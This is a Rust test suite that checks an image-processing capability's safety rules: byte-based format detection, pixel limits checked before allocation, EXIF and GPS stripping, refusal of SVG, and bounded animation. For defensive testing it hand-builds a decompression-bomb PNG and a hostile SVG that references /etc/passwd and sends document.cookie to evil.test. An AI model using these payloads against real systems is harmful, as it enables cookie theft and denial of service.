//! The image half of spec 022 §3, for `local.image`.
//!
//! Each test is named after the row of the spec's table it discharges, and each
//! step of §2's fixed decode order has one of its own. **Every fixture here is
//! authored in this file** — including the adversarial ones. A decompression
//! bomb downloaded from somewhere is a file nobody in this repository can
//! explain; one written here is 40 lines of chunk assembly whose every byte has
//! a reason.
//!
//! The allocator at the top is what makes
//! `image_dimensions_are_checked_before_allocation` an assertion rather than a
//! hope: it counts live bytes per thread, so the bomb's peak can be measured on
//! the thread that decoded it while the rest of the suite runs beside it.

use std::alloc::{GlobalAlloc, Layout, System};
use std::cell::Cell;

use donat_connectors::local::image::decoder_limits;
use donat_connectors::local::ingest::SourceFile;
use donat_connectors::local::media::{
    ImageAnimation, ImageFit, ImageOutputFormat, ImageTargetKind, ImageTargetSpec, MediaCatalog,
};
use donat_connectors::local::{LocalContext, LocalOperation, LocalProduct, StopSignal, capability};
use donat_connectors::sdk::errors::ConnectorErrorClass;
use serde_json::{Value as JsonValue, json};

// ---------------------------------------------------------------------------
// A per-thread allocation counter
// ---------------------------------------------------------------------------

struct Counting;

thread_local! {
    static LIVE: Cell<isize> = const { Cell::new(0) };
    static PEAK: Cell<isize> = const { Cell::new(0) };
}

/// Charge or refund, without allocating: both cells are `const`-initialized, so
/// touching them from inside the allocator cannot recurse into it.
fn charge(delta: isize) {
    let _ = LIVE.try_with(|live| {
        let now = live.get() + delta;
        live.set(now);
        let _ = PEAK.try_with(|peak| {
            if now > peak.get() {
                peak.set(now);
            }
        });
    });
}

unsafe impl GlobalAlloc for Counting {
    unsafe fn alloc(&self, layout: Layout) -> *mut u8 {
        let pointer = unsafe { System.alloc(layout) };
        if !pointer.is_null() {
            charge(layout.size() as isize);
        }
        pointer
    }

    unsafe fn dealloc(&self, pointer: *mut u8, layout: Layout) {
        charge(-(layout.size() as isize));
        unsafe { System.dealloc(pointer, layout) };
    }

    unsafe fn alloc_zeroed(&self, layout: Layout) -> *mut u8 {
        let pointer = unsafe { System.alloc_zeroed(layout) };
        if !pointer.is_null() {
            charge(layout.size() as isize);
        }
        pointer
    }

    unsafe fn realloc(&self, pointer: *mut u8, layout: Layout, new_size: usize) -> *mut u8 {
        let moved = unsafe { System.realloc(pointer, layout, new_size) };
        if !moved.is_null() {
            charge(new_size as isize - layout.size() as isize);
        }
        moved
    }
}

#[global_allocator]
static ALLOCATOR: Counting = Counting;

/// The most bytes this thread had live at once while `body` ran.
fn peak_bytes<T>(body: impl FnOnce() -> T) -> (T, usize) {
    let before = LIVE.with(Cell::get);
    PEAK.with(|peak| peak.set(before));
    let value = body();
    let peak = PEAK.with(Cell::get);
    (value, (peak - before).max(0) as usize)
}

// ---------------------------------------------------------------------------
// Authored fixtures
// ---------------------------------------------------------------------------

/// A real PNG of `width`×`height`, written by the same encoder the capability
/// uses, with a deterministic gradient.
fn png(width: u32, height: u32) -> Vec<u8> {
    use image::{ExtendedColorType, ImageEncoder};
    let mut pixels = image::RgbImage::new(width, height);
    for (x, y, pixel) in pixels.enumerate_pixels_mut() {
        *pixel = image::Rgb([(x % 256) as u8, (y % 256) as u8, 128]);
    }
    let mut bytes = Vec::new();
    image::codecs::png::PngEncoder::new(std::io::Cursor::new(&mut bytes))
        .write_image(pixels.as_raw(), width, height, ExtendedColorType::Rgb8)
        .expect("the fixture encodes");
    bytes
}

/// A real JPEG of `width`×`height`, with the top-left quadrant red so a
/// rotation is visible in the pixels.
fn jpeg(width: u32, height: u32) -> Vec<u8> {
    use image::{ExtendedColorType, ImageEncoder};
    let mut pixels = image::RgbImage::new(width, height);
    for (x, y, pixel) in pixels.enumerate_pixels_mut() {
        *pixel = if x < width / 2 && y < height / 2 {
            image::Rgb([220, 20, 20])
        } else {
            image::Rgb([20, 20, 220])
        };
    }
    let mut bytes = Vec::new();
    image::codecs::jpeg::JpegEncoder::new_with_quality(std::io::Cursor::new(&mut bytes), 95)
        .write_image(pixels.as_raw(), width, height, ExtendedColorType::Rgb8)
        .expect("the fixture encodes");
    bytes
}

/// CRC-32 (IEEE), the one thing a hand-assembled PNG cannot be written without.
fn crc32(bytes: &[u8]) -> u32 {
    let mut crc = 0xffff_ffff_u32;
    for byte in bytes {
        crc ^= u32::from(*byte);
        for _ in 0..8 {
            crc = if crc & 1 != 0 {
                (crc >> 1) ^ 0xedb8_8320
            } else {
                crc >> 1
            };
        }
    }
    !crc
}

fn png_chunk(kind: &[u8; 4], payload: &[u8]) -> Vec<u8> {
    let mut chunk = Vec::with_capacity(payload.len() + 12);
    chunk.extend_from_slice(&(payload.len() as u32).to_be_bytes());
    chunk.extend_from_slice(kind);
    chunk.extend_from_slice(payload);
    let mut crc_input = kind.to_vec();
    crc_input.extend_from_slice(payload);
    chunk.extend_from_slice(&crc32(&crc_input).to_be_bytes());
    chunk
}

/// **The decompression bomb.** A few kilobytes whose header claims 40000×40000
/// — 1.6 billion pixels, 6.4 GB as RGBA. The IDAT is deliberate nonsense: this
/// file exists to be refused from its header, so nothing should ever reach the
/// compressed data at all.
fn pixel_bomb_png(width: u32, height: u32) -> Vec<u8> {
    let mut header = Vec::new();
    header.extend_from_slice(&width.to_be_bytes());
    header.extend_from_slice(&height.to_be_bytes());
    // 8-bit truecolour, no interlace.
    header.extend_from_slice(&[8, 2, 0, 0, 0]);

    let mut bytes = vec![0x89, b'P', b'N', b'G', 0x0d, 0x0a, 0x1a, 0x0a];
    bytes.extend_from_slice(&png_chunk(b"IHDR", &header));
    bytes.extend_from_slice(&png_chunk(b"IDAT", &vec![0x78, 0x9c, 0x00][..]));
    bytes.extend_from_slice(&png_chunk(b"IEND", &[]));
    bytes
}

/// **A phone photo's metadata, by hand.** A real JPEG with an APP1 Exif segment
/// spliced in after the SOI: orientation 6 (rotate 90° clockwise) and a GPS IFD
/// carrying a latitude and a longitude — the pair that turns a holiday snap
/// into a home address.
fn jpeg_with_exif_gps(width: u32, height: u32) -> Vec<u8> {
    // The TIFF block. Big-endian, one IFD with the orientation and a pointer to
    // a GPS IFD, then the rational values the GPS entries point at.
    let mut tiff: Vec<u8> = vec![b'M', b'M', 0x00, 0x2a, 0x00, 0x00, 0x00, 0x08];
    let entry = |tag: u16, kind: u16, count: u32, value: [u8; 4]| {
        let mut out = Vec::with_capacity(12);
        out.extend_from_slice(&tag.to_be_bytes());
        out.extend_from_slice(&kind.to_be_bytes());
        out.extend_from_slice(&count.to_be_bytes());
        out.extend_from_slice(&value);
        out
    };
    // IFD0 at offset 8: two entries (2 + 24 + 4 = 30 bytes), so the GPS IFD
    // starts at 38.
    let gps_ifd_offset: u32 = 38;
    tiff.extend_from_slice(&2_u16.to_be_bytes());
    // 0x0112 Orientation, SHORT, 1, value 6 in the high half of the field.
    tiff.extend_from_slice(&entry(0x0112, 3, 1, [0x00, 0x06, 0x00, 0x00]));
    // 0x8825 GPS IFD pointer, LONG, 1.
    tiff.extend_from_slice(&entry(0x8825, 4, 1, gps_ifd_offset.to_be_bytes()));
    tiff.extend_from_slice(&0_u32.to_be_bytes());

    // The GPS IFD: four entries (2 + 48 + 4 = 54 bytes) starting at 38, so the
    // rational payloads start at 92.
    let latitude_offset: u32 = gps_ifd_offset + 54;
    let longitude_offset: u32 = latitude_offset + 24;
    tiff.extend_from_slice(&4_u16.to_be_bytes());
    tiff.extend_from_slice(&entry(0x0001, 2, 2, [b'N', 0, 0, 0]));
    tiff.extend_from_slice(&entry(0x0002, 5, 3, latitude_offset.to_be_bytes()));
    tiff.extend_from_slice(&entry(0x0003, 2, 2, [b'E', 0, 0, 0]));
    tiff.extend_from_slice(&entry(0x0004, 5, 3, longitude_offset.to_be_bytes()));
    tiff.extend_from_slice(&0_u32.to_be_bytes());
    // 52° 31' 12" N, 13° 24' 18" E.
    for value in [52_u32, 1, 31, 1, 12, 1, 13, 1, 24, 1, 18, 1] {
        tiff.extend_from_slice(&value.to_be_bytes());
    }

    let mut app1 = vec![0xff, 0xe1];
    let payload_length = 2 + 6 + tiff.len();
    app1.extend_from_slice(&(payload_length as u16).to_be_bytes());
    app1.extend_from_slice(b"Exif\0\0");
    app1.extend_from_slice(&tiff);

    let base = jpeg(width, height);
    let mut bytes = base[..2].to_vec();
    bytes.extend_from_slice(&app1);
    bytes.extend_from_slice(&base[2..]);
    bytes
}

/// A three-frame GIF: frame one red, frames two and three green. Anything that
/// decodes past the first frame produces green somewhere.
fn animated_gif(width: u32, height: u32) -> Vec<u8> {
    use image::codecs::gif::GifEncoder;
    use image::{Delay, Frame, Rgba, RgbaImage};

    let solid = |colour: Rgba<u8>| {
        let mut pixels = RgbaImage::new(width, height);
        for pixel in pixels.pixels_mut() {
            *pixel = colour;
        }
        Frame::from_parts(pixels, 0, 0, Delay::from_numer_denom_ms(100, 1))
    };
    let mut bytes = Vec::new();
    {
        let mut encoder = GifEncoder::new(std::io::Cursor::new(&mut bytes));
        encoder
            .encode_frames(vec![
                solid(Rgba([255, 0, 0, 255])),
                solid(Rgba([0, 255, 0, 255])),
                solid(Rgba([0, 255, 0, 255])),
            ])
            .expect("the fixture encodes");
    }
    bytes
}

/// A one-frame GIF, so the animation rule is proven to discriminate rather than
/// to refuse every GIF.
fn still_gif(width: u32, height: u32) -> Vec<u8> {
    use image::codecs::gif::GifEncoder;
    use image::{Delay, Frame, Rgba, RgbaImage};

    let mut pixels = RgbaImage::new(width, height);
    for pixel in pixels.pixels_mut() {
        *pixel = Rgba([255, 0, 0, 255]);
    }
    let mut bytes = Vec::new();
    {
        let mut encoder = GifEncoder::new(std::io::Cursor::new(&mut bytes));
        encoder
            .encode_frames(vec![Frame::from_parts(
                pixels,
                0,
                0,
                Delay::from_numer_denom_ms(100, 1),
            )])
            .expect("the fixture encodes");
    }
    bytes
}

/// The SVG that must never reach a decoder: a document with an external
/// reference and a script in it, which is what an SVG is.
const HOSTILE_SVG: &[u8] = br#"<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">
  <image href="file:///etc/passwd"/>
  <script>fetch('http://evil.test/'+document.cookie)</script>
</svg>"#;

// ---------------------------------------------------------------------------
// Harness
// ---------------------------------------------------------------------------

fn target(name: &str, mutate: impl FnOnce(&mut ImageTargetSpec)) -> ImageTargetSpec {
    let mut spec = ImageTargetSpec {
        name: name.to_owned(),
        kind: ImageTargetKind::Thumbnail,
        accept: ["image/png".to_owned(), "image/jpeg".to_owned()]
            .into_iter()
            .collect(),
        max_source_bytes: 8 * 1_024 * 1_024,
        max_pixels: 8_000_000,
        max_width: 64,
        max_height: 64,
        fit: ImageFit::Contain,
        format: ImageOutputFormat::Png,
        quality: None,
        animation: ImageAnimation::Reject,
    };
    mutate(&mut spec);
    spec
}

fn world(specs: Vec<ImageTargetSpec>, sources: Vec<SourceFile>) -> LocalContext {
    let base = LocalContext::default().with_media(
        MediaCatalog::resolve(Vec::new(), specs).expect("the test declarations resolve"),
    );
    sources
        .into_iter()
        .fold(base, |context, source| context.with_source(source))
}

fn source(handle: &str, file_name: &str, media_type: &str, bytes: Vec<u8>) -> SourceFile {
    SourceFile::new(handle, file_name, media_type, bytes)
}

fn operation(id: &str) -> &'static LocalOperation {
    capability("local.image")
        .expect("local.image is compiled into this binary")
        .admit_operation(id)
        .expect("the operation is declared and executable")
}

fn input(target: &str, source: &str) -> JsonValue {
    json!({
        "target": target,
        "source": source,
        "attachment": "public.pet.thumbnail",
        "claim_role": "app",
        "file_name": "thumb.png",
    })
}

fn render(
    context: &LocalContext,
    input: JsonValue,
) -> Result<LocalProduct, donat_connectors::sdk::ConnectorFailure> {
    operation("image.thumbnail").execute(&input, context, None, &StopSignal::new())
}

// ---------------------------------------------------------------------------
// Spec 022 §3
// ---------------------------------------------------------------------------

/// `image_format_comes_from_bytes`: a file named `.png` whose header says
/// otherwise is rejected.
///
/// Step 2 of the fixed order. The stored media type and the file name are what
/// somebody *said*; the magic is what the file is. Trusting the declaration
/// would put the choice of which decoder runs in the uploader's hands.
#[test]
fn image_format_comes_from_bytes() {
    let context = world(
        vec![target("avatar", |_| {})],
        vec![
            source("honest", "photo.png", "image/png", png(80, 60)),
            // JPEG bytes, a `.png` name, and a stored media type that agrees
            // with the name. Two out of three lies, and the bytes win.
            source("liar", "photo.png", "image/png", jpeg(80, 60)),
            source(
                "nonsense",
                "photo.png",
                "image/png",
                b"not an image".to_vec(),
            ),
        ],
    );

    assert!(render(&context, input("avatar", "honest")).is_ok());

    let failure = render(&context, input("avatar", "liar"))
        .expect_err("a file whose header disagrees with its media type is not decoded");
    assert_eq!(failure.class(), ConnectorErrorClass::Validation);
    assert_eq!(failure.code(), "local_image_format_mismatch");

    let failure = render(&context, input("avatar", "nonsense"))
        .expect_err("bytes that are no format at all are not decoded");
    assert_eq!(failure.code(), "local_image_format_unreadable");

    // And the other direction: a JPEG that says it is a JPEG decodes, so the
    // rule is "the bytes decide", not "JPEG is refused".
    let context = world(
        vec![target("avatar", |_| {})],
        vec![source("truthful", "photo.png", "image/jpeg", jpeg(80, 60))],
    );
    assert!(render(&context, input("avatar", "truthful")).is_ok());
}

/// `image_dimensions_are_checked_before_allocation`: a small file declaring
/// enormous dimensions fails without a large allocation, and the peak memory is
/// asserted.
///
/// Step 3, and the reason the order is fixed at all. 40000×40000 is 1.6 billion
/// pixels — 6.4 GB as RGBA — declared in a file of a few hundred bytes.
#[test]
fn image_dimensions_are_checked_before_allocation() {
    let bomb = pixel_bomb_png(40_000, 40_000);
    assert!(
        bomb.len() < 6_144,
        "the bomb is a few kilobytes claiming gigabytes: {} bytes",
        bomb.len()
    );

    let context = world(
        vec![target("avatar", |_| {})],
        vec![source("bomb", "innocent.png", "image/png", bomb)],
    );

    let (failure, peak) = peak_bytes(|| {
        render(&context, input("avatar", "bomb"))
            .expect_err("a file over the declared pixel ceiling is not decoded")
    });
    assert_eq!(failure.class(), ConnectorErrorClass::Validation);
    assert_eq!(failure.code(), "local_image_too_many_pixels");
    assert!(
        peak < 1_048_576,
        "the header check must precede the pixel buffer: {peak} bytes peaked for a file that \
         declared 6.4 GB of pixels"
    );

    // The boundary itself is exact, and it is the declaration's number: a
    // target admitting 8000 pixels takes 100×80 and refuses 100×81.
    let context = world(
        vec![target("tight", |spec| {
            spec.max_pixels = 8_000;
            spec.max_width = 80;
            spec.max_height = 80;
        })],
        vec![
            source("exact", "a.png", "image/png", png(100, 80)),
            source("over", "b.png", "image/png", png(100, 81)),
        ],
    );
    assert!(render(&context, input("tight", "exact")).is_ok());
    assert_eq!(
        render(&context, input("tight", "over"))
            .expect_err("one pixel over the ceiling is refused")
            .code(),
        "local_image_too_many_pixels"
    );
}

/// `image_decoder_limits_are_set`: the decoder's own limits are configured from
/// the declared bounds.
///
/// Step 4, the second line. It is redundant with step 3 by design — which is
/// what makes it worth having, because a redundant bound is what catches a
/// decoder that reports one size and allocates another.
#[test]
fn image_decoder_limits_are_set() {
    let catalog = MediaCatalog::resolve(
        Vec::new(),
        vec![target("avatar", |spec| {
            spec.max_pixels = 2_000_000;
        })],
    )
    .expect("the declaration resolves");
    let declared = catalog.image("avatar").expect("the target is declared");

    let limits = decoder_limits(declared);
    assert_eq!(limits.max_image_width, Some(2_000_000));
    assert_eq!(limits.max_image_height, Some(2_000_000));
    assert_eq!(
        limits.max_alloc,
        Some(2_000_000 * 4 + 4 * 1_024 * 1_024),
        "the allocation ceiling is the declared pixel budget as RGBA, plus bounded decoder \
         overhead"
    );

    // The limits the open path installs are these limits: same declaration,
    // same numbers, taken from the decoder the path actually built.
    let source = source("photo", "a.png", "image/png", png(80, 60));
    let opened = donat_connectors::local::image::installed_limits(declared, &source)
        .expect("a source inside the declaration opens");
    assert_eq!(opened.max_image_width, limits.max_image_width);
    assert_eq!(opened.max_image_height, limits.max_image_height);
    assert_eq!(opened.max_alloc, limits.max_alloc);

    // And they are limits rather than decoration: a decoder given them refuses
    // an image past them, which is the behaviour step 3 would otherwise be
    // alone in providing.
    let mut narrow = image::Limits::no_limits();
    narrow.max_image_width = Some(16);
    narrow.max_image_height = Some(16);
    let mut decoder = image::codecs::png::PngDecoder::new(std::io::Cursor::new(png(80, 60)))
        .expect("the fixture's header reads");
    assert!(
        image::ImageDecoder::set_limits(&mut decoder, narrow).is_err(),
        "a decoder honours the limits it is given"
    );
}

/// `image_metadata_is_stripped`: a source with EXIF GPS produces output with no
/// metadata, and orientation is applied to the pixels first.
///
/// Step 6. Dropping the metadata is the data-protection half; applying the
/// orientation before dropping it is what stops that from silently rotating
/// every photo taken in portrait.
#[test]
fn image_metadata_is_stripped() {
    let with_exif = jpeg_with_exif_gps(80, 40);

    // The fixture is what it claims to be — otherwise this test would pass on
    // an input that never carried metadata at all.
    let mut probe = image::codecs::jpeg::JpegDecoder::new(std::io::Cursor::new(&with_exif))
        .expect("the fixture's header reads");
    assert_eq!(
        image::ImageDecoder::orientation(&mut probe).expect("the fixture declares an orientation"),
        image::metadata::Orientation::Rotate90,
        "the fixture carries orientation 6"
    );
    let exif = image::ImageDecoder::exif_metadata(&mut probe)
        .expect("the fixture's metadata reads")
        .expect("the fixture carries Exif");
    assert!(
        exif.windows(2)
            .any(|window| window == 0x8825_u16.to_be_bytes()),
        "the fixture carries a GPS IFD"
    );
    assert!(
        with_exif.windows(6).any(|window| window == b"Exif\0\0"),
        "the source carries an APP1 Exif segment"
    );

    let context = world(
        vec![target("photo", |spec| {
            spec.format = ImageOutputFormat::Jpeg;
            spec.quality = Some(90);
            spec.max_width = 200;
            spec.max_height = 200;
        })],
        vec![source("phone", "IMG_0001.jpg", "image/jpeg", with_exif)],
    );
    let product = render(&context, input("photo", "phone")).expect("the source re-encodes");
    let LocalProduct::Artifact { artifact, metadata } = product else {
        panic!("a produced image is an artifact");
    };

    // Nothing about the source's metadata survives.
    let bytes = artifact.bytes();
    assert!(
        !bytes.windows(6).any(|window| window == b"Exif\0\0"),
        "the output carries no Exif segment"
    );
    assert!(
        !bytes.windows(2).any(|window| window == [0xff, 0xe1]),
        "the output carries no APP1 marker at all"
    );
    let mut output = image::codecs::jpeg::JpegDecoder::new(std::io::Cursor::new(bytes))
        .expect("the output reads");
    assert_eq!(
        image::ImageDecoder::exif_metadata(&mut output).expect("the output's metadata reads"),
        None,
        "no metadata is carried across"
    );
    assert_eq!(metadata["metadata_stripped"], json!(true));

    // The orientation reached the pixels before it was discarded: an 80×40
    // source rotated 90° is 40 wide and 80 tall, and the red quadrant that was
    // top-left is now top-right.
    assert_eq!(metadata["source_width"], json!(80));
    assert_eq!(metadata["source_height"], json!(40));
    assert_eq!(metadata["width"], json!(40));
    assert_eq!(metadata["height"], json!(80));
    assert_eq!(metadata["orientation_applied"], json!(true));
    let decoded = image::load_from_memory(bytes)
        .expect("the output decodes")
        .to_rgb8();
    let is_red = |pixel: &image::Rgb<u8>| pixel.0[0] > 150 && pixel.0[2] < 100;
    assert!(
        is_red(decoded.get_pixel(decoded.width() - 3, 2)),
        "the source's top-left quadrant is the output's top-right"
    );
    assert!(
        !is_red(decoded.get_pixel(2, 2)),
        "and the output's top-left is not red any more"
    );
}

/// `image_rejects_svg_and_unlisted_types`: SVG and any media type outside the
/// allowlist never reach a decoder.
///
/// Step 1. SVG is refused twice over: a declaration that lists it does not
/// resolve, and no SVG decoder is linked into this binary to reach.
#[test]
fn image_rejects_svg_and_unlisted_types() {
    // A target may not even declare SVG.
    let rejections = MediaCatalog::resolve(
        Vec::new(),
        vec![target("svg_target", |spec| {
            spec.accept = ["image/svg+xml".to_owned()].into_iter().collect();
        })],
    )
    .expect_err("an SVG target is not a target");
    assert!(
        rejections[0]
            .message
            .contains("does not belong in a decoder path"),
        "{rejections:?}"
    );

    // And a stored file that claims to be one is refused at step 1, whatever
    // its bytes are.
    let context = world(
        vec![target("avatar", |_| {})],
        vec![
            source("svg", "logo.svg", "image/svg+xml", HOSTILE_SVG.to_vec()),
            // A media type this binary can decode, that this target did not
            // declare: the allowlist is the target's, not the binary's.
            source("gif", "loop.gif", "image/gif", still_gif(16, 16)),
            // A media type nothing here decodes at all.
            source(
                "tiff",
                "scan.tiff",
                "image/tiff",
                vec![0x49, 0x49, 0x2a, 0x00],
            ),
            // The oldest trick: an SVG wearing a PNG's name and media type. It
            // gets past step 1 and is stopped by step 2, which is why there are
            // two steps.
            source("disguised", "logo.png", "image/png", HOSTILE_SVG.to_vec()),
        ],
    );
    for handle in ["svg", "gif", "tiff"] {
        let failure = render(&context, input("avatar", handle))
            .expect_err("a media type outside the allowlist never reaches a decoder");
        assert_eq!(failure.class(), ConnectorErrorClass::Validation, "{handle}");
        assert_eq!(
            failure.code(),
            "local_image_media_type_refused",
            "{handle} must be refused by the allowlist, before any decoder exists"
        );
    }
    let failure = render(&context, input("avatar", "disguised"))
        .expect_err("an SVG wearing a PNG media type is still never decoded");
    assert_eq!(failure.code(), "local_image_format_unreadable");
}

/// `image_animation_is_bounded`: a multi-frame source produces one frame and
/// does not decode the rest.
///
/// Step 5. The frame count is read from the container's own index before
/// anything is decoded, because counting frames by decoding them is precisely
/// what the bound exists to prevent.
#[test]
fn image_animation_is_bounded() {
    let frames = animated_gif(32, 32);

    // The default is to refuse: a deployment that never thought about animation
    // gets the answer that decodes least.
    let context = world(
        vec![target("strict", |spec| {
            spec.accept = ["image/gif".to_owned()].into_iter().collect();
        })],
        vec![source("loop", "loop.gif", "image/gif", frames.clone())],
    );
    let failure = render(&context, input("strict", "loop"))
        .expect_err("an animated source is refused unless the target admits one");
    assert_eq!(failure.class(), ConnectorErrorClass::Validation);
    assert_eq!(failure.code(), "local_image_animation_refused");

    // A target that declares `first_frame` gets exactly one, and it is the
    // first: frame one is red, frames two and three are green.
    let context = world(
        vec![target("first", |spec| {
            spec.accept = ["image/gif".to_owned()].into_iter().collect();
            spec.animation = ImageAnimation::FirstFrame;
        })],
        vec![
            source("loop", "loop.gif", "image/gif", frames),
            source("still", "still.gif", "image/gif", still_gif(32, 32)),
        ],
    );
    let product = render(&context, input("first", "loop")).expect("the first frame decodes");
    let LocalProduct::Artifact { artifact, metadata } = product else {
        panic!("a produced image is an artifact");
    };
    assert_eq!(metadata["source_animated"], json!(true));
    assert_eq!(metadata["frames_decoded"], json!(1));
    let decoded = image::load_from_memory(artifact.bytes())
        .expect("the output decodes")
        .to_rgb8();
    for pixel in decoded.pixels() {
        assert!(
            pixel.0[0] > 200 && pixel.0[1] < 60,
            "every pixel comes from the first frame, which is red: {pixel:?}"
        );
    }

    // And a still GIF is not an animated one, so the rule discriminates rather
    // than refusing a whole format.
    let product = render(&context, input("first", "still")).expect("a still GIF decodes");
    let LocalProduct::Artifact { metadata, .. } = product else {
        panic!("a produced image is an artifact");
    };
    assert_eq!(metadata["source_animated"], json!(false));
}

/// The two operations differ in what their declaration may ask for, and a
/// target renders through its own operation and no other.
#[test]
fn a_target_renders_through_its_own_operation() {
    let context = world(
        vec![
            target("avatar", |_| {}),
            target("full_size", |spec| {
                spec.kind = ImageTargetKind::Normalize;
                spec.max_width = 2_048;
                spec.max_height = 2_048;
            }),
        ],
        vec![source("photo", "a.png", "image/png", png(200, 100))],
    );

    // A thumbnail is scaled into its box; a normalization of something smaller
    // than its box is the same size, re-encoded.
    let LocalProduct::Artifact { metadata, .. } =
        render(&context, input("avatar", "photo")).expect("the thumbnail renders")
    else {
        panic!("a produced image is an artifact");
    };
    assert_eq!(
        (metadata["width"].clone(), metadata["height"].clone()),
        (json!(64), json!(32))
    );

    let LocalProduct::Artifact { metadata, .. } = operation("image.normalize")
        .execute(
            &input("full_size", "photo"),
            &context,
            None,
            &StopSignal::new(),
        )
        .expect("the normalization renders")
    else {
        panic!("a produced image is an artifact");
    };
    assert_eq!(
        (metadata["width"].clone(), metadata["height"].clone()),
        (json!(200), json!(100))
    );

    // An unresolved source and an undeclared target are both refused before
    // anything is opened.
    assert_eq!(
        render(&context, input("avatar", "absent"))
            .expect_err("a source nobody resolved is not a source")
            .code(),
        "local_image_source_unresolved"
    );
    assert_eq!(
        render(&context, input("absent", "photo"))
            .expect_err("an undeclared target is not a target")
            .code(),
        "local_image_target_unknown"
    );
}
